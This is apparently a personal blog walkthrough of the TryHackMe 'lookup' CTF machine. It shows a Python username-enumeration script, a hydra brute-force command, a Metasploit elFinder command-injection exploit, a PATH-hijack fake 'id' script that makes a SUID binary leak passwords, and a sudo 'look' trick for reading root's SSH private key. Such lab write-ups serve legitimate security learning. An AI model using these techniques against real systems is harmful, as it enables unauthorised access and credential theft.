---
title: 'lookup: testing my enumeration skills on this boot-to-root machine'
date: 2025-11-22
categories:
  - TryHackMe
  - CTF
tags:
  - ctf
  - linux
  - terminal
  - nmap
  - python
  - hydra
  - beginner
  - hands-on
  - easy
  - metasploit
comments: false
toc: true
---


> TryHackMe Machine: [lookup](https://tryhackme.com/room/lookup)
> was on a break cus of clg nd shits.. and now after so long re-starting my system :>

**about the room:** it’s all bout recon, scanning, and enumeration , find hidden services and subdomains, then abuse the ones that look vulnerable.

## step 1: initial setup

* connected to the thm vpn and started the machine
* added the `<machine_ip>` to `lookup.thm` in my hosts (used my own tool [ctfhost](https://github.com/LavSarkari/ctfhost) cause im lazy :3)

### observation time

1. with `lookup.thm` resolving, i visited `http://lookup.thm/` , single login page, nice target.
2. tried global creds `admin:admin` (classic move) , got a "wrong password" message. dumb but fast checks save time.
3. that exact error text `"Wrong password. Please try again. Redirecting in 3 seconds."` leaked that `admin` is a valid username (error pages be loud). tested a few other usernames to confirm it wasn't a generic error , turns out `admin` was legit. lucky charm :>
4. asked gpt to spit a tiny python bruteforce that enumerates usernames from `seclists` (names list) against the login , used it to quickly check which usernames exist. script below.

```py
#!/usr/bin/env python3
import os,sys,time,argparse,requests
from pathlib import Path

URL="http://lookup.thm/login.php"

def find_wordlist(name="names.txt",start="/"):
    for root,dirs,files in os.walk(start,onerror=lambda e:None):
        if name in files:
            return Path(root)/name
    return None

p=find_wordlist()
parser=argparse.ArgumentParser()
parser.add_argument("--pw","-p",default="password")
parser.add_argument("--dry",action="store_true")
parser.add_argument("--delay","-d",type=float,default=0.5)
args=parser.parse_args()

if not p:
    print("wordlist not found"); sys.exit(1)

s=requests.Session()
h={"User-Agent":"Mozilla/5.0"}

for ln in p.read_text(errors="ignore").splitlines():
    u=ln.strip()
    if not u: continue
    data={"username":u,"password":args.pw}
    if args.dry:
        print(data); continue
    try:
        r=s.post(URL,data=data,headers=h,timeout=6,allow_redirects=False)
    except requests.RequestException as e:
        print("request error:",e); break
    t=r.text.lower()
    if any(x in t for x in ("wrong password","invalid password","password incorrect")):
        print("username found:",u)
    time.sleep(args.delay)
```

and *wowhh :3 found larry* , one was `admin`, another one was `jose`.

5. time to bruteforce `jose` with hydra (rockyou):

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

mother luck was on our side , found the password: `********123` (hehe lookout forursefl)

6. after login we got redirected to `http://files.lookup.thm/` , add `files.lookup.thm` to hosts and go check it out.
7. boom , an elFinder file manager popped up. whole file system access-ish and a bunch of files that look like passwords.
8. plan: find elFinder version to search for public exploits to pwn

### elfinder -> exploit

1. found version by clicking the `?` icon in the UI to *version = 2.1.47*
2. `searchsploit` + web check: there is a known exploit for `elFinder PHP Connector < 2.1.48` , command injection with `exiftran` (metasploit module exists). taadddaa, MSF module ready.
3. let’s use it quick , follow the usual msfconsole setup... (search elFinder and selected 4)
4. ChatGPT for the win! (also note: the username wordlist path is hard-coded in my script , change it if you want another list)

---

## after the pwn , pivoting to shell

after using the msf module (set RHOSTS to `files.lookup.thm`, set LHOST to my ubuntu ip, run exploit), we got a shell as `www-data`.

### privilege escalation , part 1

* checked `/etc/passwd` to saw user `think` and `root`.
* ls `think`'s home , there is a `.passwords` file but no read permission. interesting.
* searched for suid binaries:

```bash
find / -perm /4000 2>/dev/null
```

* `/usr/sbin/pwm` caught my eye , not a default binary, owned by root.
* running it printed something that included `id` output and then tried to write into `/home/<user>/.passwords` , looks like it runs `id` and parses the username.
* if the binary calls `id` without full path, it will resolve `id` via `PATH` , that’s our injection vector.

so i added `/tmp` to PATH and dropped a fake `id` there:

```bash
export PATH=/tmp:$PATH
cat > /tmp/id <<'SH'
#!/bin/sh
printf "uid=1000(think) gid=1000(think) groups=1000(think)\n"
SH
chmod +x /tmp/id

# run the binary
/usr/sbin/pwm
```

bingo , pwm parsed `think` as the username and printed a password list (saved it or copied it out). saved the creds and tried ssh.

```bash
ssh think@lookup.thm
# password: <from pwm output>
```

login success , we’re `think` now.

### privilege escalation , part 2

* checked `sudo -l` for think to can run `look` as root.
* checked GTFOBins: `look` can be abused to read files when run as root.
* fastest win: read root's `~/.ssh/id_rsa` and grab root ssh key.

```bash
# as think
sudo -l
# to read root ssh key (example using gtfobins technique)
sudo look /root/.ssh/id_rsa
```

save the key locally, set proper perms and ssh in as root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```

and that’s it , lookup is R00T3D. r00t: acquired. :p

---

## tl;dr

* quick dns tweak (ctfhost) to site up
* username enumeration via tiny python script to `admin`, `jose`
* hydra with rockyou to cracked jose
* files.lookup.thm to elFinder 2.1.47 to metasploit module (exiftran cmd injection) to shell as `www-data`
* suid binary `/usr/sbin/pwm` abused via PATH trick to leaked `think` creds to ssh as `think`
* `think` can sudo `look` to read root ssh key to ssh as root

---

## how i did it (copy-paste snippets)

```bash
# hosts
echo "<machine_ip> lookup.thm files.lookup.thm" | sudo tee -a /etc/hosts

# quick nmap
nmap -sC -sV -p- lookup.thm

# hydra example
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V

# pwm exploit path trick
scp id_rsa root@kali:/tmp/ # example
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```

---

## notes & pro tips (for future me)

* error messages leak , that `redirecting in 3 seconds` told us admin exists. read every sentence. :3
* use small focused lists first (common user lists) before blasting huge wordlists , saves time and noise.
* when bruteforcing, check body text and response length, not just status codes , forms redirect/302 a lot.
* elFinder versions are clickable in UI (look for `?` or the footer) , always check the UI for version strings.
* when a suid binary uses plain `id` or other common utils, PATH hijack is your friend.

